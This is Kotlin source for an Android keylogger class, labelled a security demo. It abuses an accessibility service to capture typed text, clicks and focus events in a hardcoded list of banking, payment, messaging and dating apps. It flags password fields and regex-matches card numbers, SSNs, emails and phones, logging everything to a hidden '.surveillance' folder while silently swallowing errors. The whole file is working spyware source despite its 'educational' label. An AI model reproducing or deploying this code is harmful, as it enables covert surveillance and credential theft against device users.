package com.securitydemo.malware.utils

import android.content.Context
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import java.util.regex.Pattern

/**
 * SECURITY DEMO: Keylogger Engine
 * 
 * This class demonstrates advanced keylogging techniques used by malware:
 * - Complete keystroke capture and analysis
 * - Password and credential detection
 * - Sensitive information pattern matching
 * - Real-time input monitoring
 * - Context-aware logging (app-specific capture)
 * 
 * EDUCATIONAL PURPOSE ONLY - Shows real keylogging methods
 */
class KeyloggerEngine(private val context: Context) {

    companion object {
        private val PASSWORD_PATTERNS = arrayOf(
            Pattern.compile("password", Pattern.CASE_INSENSITIVE),
            Pattern.compile("pin", Pattern.CASE_INSENSITIVE),
            Pattern.compile("passw", Pattern.CASE_INSENSITIVE),
            Pattern.compile("pwd", Pattern.CASE_INSENSITIVE)
        )
        
        private val CREDIT_CARD_PATTERN = Pattern.compile("\\b\\d{4}[\\s-]?\\d{4}[\\s-]?\\d{4}[\\s-]?\\d{4}\\b")
        private val EMAIL_PATTERN = Pattern.compile("\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}\\b")
        private val PHONE_PATTERN = Pattern.compile("\\b\\d{3}[\\s.-]?\\d{3}[\\s.-]?\\d{4}\\b")
        private val SSN_PATTERN = Pattern.compile("\\b\\d{3}[\\s-]?\\d{2}[\\s-]?\\d{4}\\b")
        private val URL_PATTERN = Pattern.compile("https?://[\\w\\.-]+\\.[a-z]{2,}")
    }

    private val dateFormatter = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
    private var isActive = false
    private var keystrokeCount = 0
    private var credentialsFound = 0
    private var sensitiveDataCount = 0

    private val targetApps = setOf(
        "com.android.chrome",
        "com.google.android.gm", // Gmail
        "com.whatsapp",
        "com.facebook.messenger",
        "com.paypal.android.p2pmobile",
        "com.chase.sig.android",
        "com.bankofamerica.digitalwallet",
        "com.venmo",
        "com.square.cash",
        "com.instagram.android",
        "com.snapchat.android",
        "com.tinder"
    )

    /**
     * Start keylogging operation
     */
    fun startKeylogging(): Boolean {
        return try {
            if (!isAccessibilityServiceEnabled()) {
                return false
            }

            isActive = true
            keystrokeCount = 0
            credentialsFound = 0
            sensitiveDataCount = 0

            logKeyloggerActivity("🚀 Keylogger engine started")
            logKeyloggerActivity("🎯 Target applications: ${targetApps.size} high-value apps")
            logKeyloggerActivity("🔍 Monitoring patterns: passwords, cards, emails, phones")

            true
        } catch (e: Exception) {
            false
        }
    }

    /**
     * Stop keylogging operation
     */
    fun stopKeylogging() {
        isActive = false
        logKeyloggerActivity("⏹️ Keylogger engine stopped")
        logKeyloggerActivity("📊 Session summary: $keystrokeCount keystrokes, $credentialsFound credentials")
    }

    /**
     * Process accessibility event for keylogging
     * This would be called by the accessibility service
     */
    fun processAccessibilityEvent(event: AccessibilityEvent) {
        if (!isActive) return

        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    handleTextChanged(event)
                }
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                    handleViewFocused(event)
                }
                AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                    handleViewClicked(event)
                }
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    handleWindowStateChanged(event)
                }
            }
        } catch (e: Exception) {
            // Silently handle errors
        }
    }

    private fun handleTextChanged(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString()
        val text = event.text?.toString()
        val className = event.className?.toString()

        if (text.isNullOrEmpty()) return

        keystrokeCount += text.length

        // Context-aware logging for high-value apps
        val isTargetApp = targetApps.contains(packageName)
        val isPasswordField = isPasswordField(className, event)
        val containsSensitiveData = containsSensitiveInformation(text)

        val keystroke = KeystrokeData(
            timestamp = System.currentTimeMillis(),
            packageName = packageName ?: "unknown",
            className = className ?: "unknown",
            text = if (isPasswordField) "[PASSWORD:${text.length}chars]" else text,
            isPasswordField = isPasswordField,
            isTargetApp = isTargetApp,
            containsSensitiveData = containsSensitiveData,
            textLength = text.length
        )

        logKeystroke(keystroke)

        if (containsSensitiveData) {
            analyzeSensitiveContent(text, packageName ?: "unknown")
        }

        if (isPasswordField) {
            credentialsFound++
            logCredentialCapture(packageName ?: "unknown", text.length)
        }
    }

    private fun handleViewFocused(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString()
        val className = event.className?.toString()
        
        if (isPasswordField(className, event)) {
            logKeyloggerActivity("🎯 Password field focused in $packageName")
        }
    }

    private fun handleViewClicked(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString()
        val text = event.text?.toString()
        
        logKeyloggerActivity("👆 Click captured: $text in $packageName")
    }

    private fun handleWindowStateChanged(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString()
        
        if (targetApps.contains(packageName)) {
            logKeyloggerActivity("🏦 High-value app opened: $packageName")
        }
    }

    private fun isPasswordField(className: String?, event: AccessibilityEvent): Boolean {
        if (className == null) return false
        
        return className.toLowerCase().contains("password") ||
               className.toLowerCase().contains("pin") ||
               event.isPassword
    }

    private fun containsSensitiveInformation(text: String): Boolean {
        return CREDIT_CARD_PATTERN.matcher(text).find() ||
               EMAIL_PATTERN.matcher(text).find() ||
               PHONE_PATTERN.matcher(text).find() ||
               SSN_PATTERN.matcher(text).find() ||
               URL_PATTERN.matcher(text).find() ||
               PASSWORD_PATTERNS.any { it.matcher(text).find() }
    }

    private fun analyzeSensitiveContent(text: String, packageName: String) {
        sensitiveDataCount++
        
        val analysis = SensitiveDataAnalysis(
            timestamp = System.currentTimeMillis(),
            packageName = packageName,
            dataType = detectSensitiveDataType(text),
            riskLevel = calculateRiskLevel(packageName, text),
            textLength = text.length
        )
        
        logSensitiveData(analysis)
    }

    private fun detectSensitiveDataType(text: String): String {
        return when {
            CREDIT_CARD_PATTERN.matcher(text).find() -> "CREDIT_CARD"
            EMAIL_PATTERN.matcher(text).find() -> "EMAIL_ADDRESS"
            PHONE_PATTERN.matcher(text).find() -> "PHONE_NUMBER"
            SSN_PATTERN.matcher(text).find() -> "SSN"
            URL_PATTERN.matcher(text).find() -> "URL"
            PASSWORD_PATTERNS.any { it.matcher(text).find() } -> "PASSWORD"
            else -> "UNKNOWN_SENSITIVE"
        }
    }

    private fun calculateRiskLevel(packageName: String, text: String): String {
        val baseRisk = when {
            packageName.contains("bank") || packageName.contains("pay") -> 3
            packageName.contains("social") || packageName.contains("message") -> 2
            else -> 1
        }
        
        val contentRisk = when {
            CREDIT_CARD_PATTERN.matcher(text).find() -> 3
            SSN_PATTERN.matcher(text).find() -> 3
            PASSWORD_PATTERNS.any { it.matcher(text).find() } -> 2
            else -> 1
        }
        
        val totalRisk = baseRisk + contentRisk
        
        return when {
            totalRisk >= 5 -> "CRITICAL"
            totalRisk >= 3 -> "HIGH"
            totalRisk >= 2 -> "MEDIUM"
            else -> "LOW"
        }
    }

    private fun logCredentialCapture(packageName: String, passwordLength: Int) {
        try {
            val credentialLog = File(context.filesDir, ".surveillance/credentials.log")
            credentialLog.parentFile?.mkdirs()
            
            val timestamp = dateFormatter.format(Date())
            val logEntry = "[$timestamp] CREDENTIAL_CAPTURED - App: $packageName, Length: $passwordLength chars\n"
            
            credentialLog.appendText(logEntry)
            
        } catch (e: Exception) {
            // Silently fail
        }
    }

    private fun logKeystroke(keystroke: KeystrokeData) {
        try {
            val keystrokeLog = File(context.filesDir, ".surveillance/keystrokes.log")
            keystrokeLog.parentFile?.mkdirs()
            
            val timestamp = dateFormatter.format(Date(keystroke.timestamp))
            val logEntry = "[$timestamp] ${keystroke.packageName} - ${keystroke.className} - " +
                          "${if (keystroke.isPasswordField) "[PASSWORD]" else keystroke.text} - " +
                          "Target:${keystroke.isTargetApp}, Sensitive:${keystroke.containsSensitiveData}\n"
            
            keystrokeLog.appendText(logEntry)
            
        } catch (e: Exception) {
            // Silently fail
        }
    }

    private fun logSensitiveData(analysis: SensitiveDataAnalysis) {
        try {
            val sensitiveLog = File(context.filesDir, ".surveillance/sensitive_data.log")
            sensitiveLog.parentFile?.mkdirs()
            
            val timestamp = dateFormatter.format(Date(analysis.timestamp))
            val logEntry = "[$timestamp] SENSITIVE_DATA - App: ${analysis.packageName}, " +
                          "Type: ${analysis.dataType}, Risk: ${analysis.riskLevel}\n"
            
            sensitiveLog.appendText(logEntry)
            
        } catch (e: Exception) {
            // Silently fail
        }
    }

    private fun logKeyloggerActivity(activity: String) {
        try {
            val activityLog = File(context.filesDir, ".surveillance/keylogger_activity.log")
            activityLog.parentFile?.mkdirs()
            
            val timestamp = dateFormatter.format(Date())
            val logEntry = "[$timestamp] $activity\n"
            
            activityLog.appendText(logEntry)
            
        } catch (e: Exception) {
            // Silently fail
        }
    }

    /**
     * Generate comprehensive keylogger report
     */
    fun generateReport(): String {
        val report = StringBuilder()
        report.append("=== KEYLOGGER SURVEILLANCE REPORT ===\n\n")
        
        try {
            report.append("📊 CAPTURE STATISTICS:\n")
            report.append("• Total keystrokes: $keystrokeCount\n")
            report.append("• Credentials captured: $credentialsFound\n")
            report.append("• Sensitive data points: $sensitiveDataCount\n")
            report.append("• Status: ${if (isActive) "ACTIVE" else "INACTIVE"}\n\n")
            
            // Recent keystroke activity
            val keystrokeLog = File(context.filesDir, ".surveillance/keystrokes.log")
            if (keystrokeLog.exists()) {
                val recentKeystrokes = keystrokeLog.readText().split('\n').takeLast(10)
                report.append("🔍 RECENT KEYSTROKE ACTIVITY:\n")
                recentKeystrokes.forEach { keystroke ->
                    if (keystroke.isNotEmpty()) {
                        report.append("${keystroke.take(100)}...\n")
                    }
                }
                report.append("\n")
            }
            
            // Credential captures
            val credentialLog = File(context.filesDir, ".surveillance/credentials.log")
            if (credentialLog.exists()) {
                val recentCredentials = credentialLog.readText().split('\n').takeLast(5)
                report.append("🔐 CREDENTIAL CAPTURES:\n")
                recentCredentials.forEach { credential ->
                    if (credential.isNotEmpty()) {
                        report.append("$credential\n")
                    }
                }
                report.append("\n")
            }
            
            // Sensitive data analysis
            val sensitiveLog = File(context.filesDir, ".surveillance/sensitive_data.log")
            if (sensitiveLog.exists()) {
                val recentSensitive = sensitiveLog.readText().split('\n').takeLast(5)
                report.append("🚨 SENSITIVE DATA DETECTIONS:\n")
                recentSensitive.forEach { sensitive ->
                    if (sensitive.isNotEmpty()) {
                        report.append("$sensitive\n")
                    }
                }
            }
            
        } catch (e: Exception) {
            report.append("Error generating keylogger report: ${e.message}")
        }
        
        return report.toString()
    }

    /**
     * Get current keystroke count
     */
    fun getKeystrokeCount(): Int = keystrokeCount

    /**
     * Get credentials found count
     */
    fun getCredentialsFound(): Int = credentialsFound

    /**
     * Check if accessibility service is enabled
     */
    private fun isAccessibilityServiceEnabled(): Boolean {
        val enabledServices = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        )
        return enabledServices?.contains(context.packageName) == true
    }

    /**
     * Data classes for structured logging
     */
    private data class KeystrokeData(
        val timestamp: Long,
        val packageName: String,
        val className: String,
        val text: String,
        val isPasswordField: Boolean,
        val isTargetApp: Boolean,
        val containsSensitiveData: Boolean,
        val textLength: Int
    )

    private data class SensitiveDataAnalysis(
        val timestamp: Long,
        val packageName: String,
        val dataType: String,
        val riskLevel: String,
        val textLength: Int
    )
}
